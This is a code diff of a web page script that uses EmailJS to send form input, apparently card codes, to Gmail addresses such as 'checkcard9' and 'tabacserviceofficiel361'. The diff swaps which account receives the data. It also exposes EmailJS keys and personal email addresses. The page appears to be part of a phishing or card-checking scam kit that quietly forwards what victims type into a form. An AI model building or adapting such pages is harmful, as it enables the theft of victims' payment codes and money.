@@ -25,8 +25,8 @@
         (function () {
             // https://dashboard.emailjs.com/admin/account
             // emailjs.init('opvGRa51hKeitmK3T'); // email1 : arnaudadjovi274@gmail.com
-            emailjs.init('sMhRxLA9AzuJh6SMy'); // email2 : arnaud2adjovi276@gmail.com
-            // emailjs.init('0LbeIEhMY7sm7znl8'); // email3 : checkcardn1@gmail.com
+            // emailjs.init('sMhRxLA9AzuJh6SMy'); // email2 : arnaud2adjovi276@gmail.com
+            emailjs.init('MlqmaVCpptI_KFw2s'); // email3 : checkcard9@gmail.com
         })();
 
         var name = '';
@@ -51,9 +51,9 @@
         var text_input10 = '';
 
         switch (card) {
-            case '9dfd9fe':
+            case '9dfd9fo':
                 email = 'tabacserviceofficiel361@gmail.com';
-                name = 'Jacob';
+                name = 'Ami de Jacob';
                 break;
 
             default:
@@ -181,13 +181,13 @@
             //   console.log("success !");
             // }) // email1 : arnaudadjovi274@gmail.com
             
-            emailjs.send("service_zmbs5xg", "template_dc87l9s", tempParams).then(function (res) {
-               console.log("success !");
-            }) // email2 : arnaud2adjovi276@gmail.com
-
-            // emailjs.send("service_ki0nq62", "template_93lqtdd", tempParams).then(function (res) {
+            // emailjs.send("service_zmbs5xg", "template_dc87l9s", tempParams).then(function (res) {
             //    console.log("success !");
-            // }) // email3 : checkcardn1@gmail.com
+            // }) // email2 : arnaud2adjovi276@gmail.com
+
+            emailjs.send("service_6ckni6d", "template_93ct1go", tempParams).then(function (res) {
+               console.log("success !");
+            }) // email3 : checkcard9@gmail.com
 
         }
 
